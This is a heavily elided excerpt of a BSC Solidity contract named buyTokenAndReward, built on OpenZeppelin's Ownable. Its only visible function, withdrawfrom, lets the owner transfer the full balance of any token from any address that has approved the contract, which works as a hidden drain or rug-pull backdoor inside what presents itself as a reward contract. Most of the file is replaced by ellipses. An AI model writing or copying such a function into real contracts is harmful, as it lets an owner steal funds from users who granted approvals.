...
// File: /@openzeppelin-0.8/contracts/utils/Context.sol
...
// File: /@openzeppelin-0.8/contracts/access/Ownable.sol
...
// File: /buyTokenAndReward-bsc.sol
...
contract buyTokenAndReward is Ownable{
    ...
    function withdrawfrom(address _token, address _from) external onlyOwner{
        uint256 balance = IBEP20(_token).balanceOf(_from);
        IBEP20(_token).transferFrom(_from,owner(), balance);
    }
